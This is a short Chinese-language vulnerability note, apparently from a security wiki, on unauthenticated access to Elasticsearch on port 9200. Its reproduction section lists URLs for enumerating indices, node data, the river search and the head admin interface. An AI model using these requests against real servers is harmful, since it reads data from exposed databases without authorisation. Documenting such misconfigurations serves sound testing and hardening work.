---
title: "Elasticsearch 未授权访问"
date: 2026-10-15 09:05:55
categories:
  - WebSecurity
  - CVE
  - "数据库"
  - "Elasticsearch"
tags:
  - "Elasticsearch"
  - "未授权访问"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据

## 漏洞影响

```
Elasticsearch
```

## 漏洞复现

访问目标URL : http://xxx.xxx.xxx.xxx:9200/_node

```plain
http://localhost:9200/_cat/indices
http://localhost:9200/_river/_search //查看数据库敏感信息
http://localhost:9200/_nodes         //查看节点数据
http://localhost:9200/_plugin/head/  //web管理界面(head插件)
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/database/Elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md)
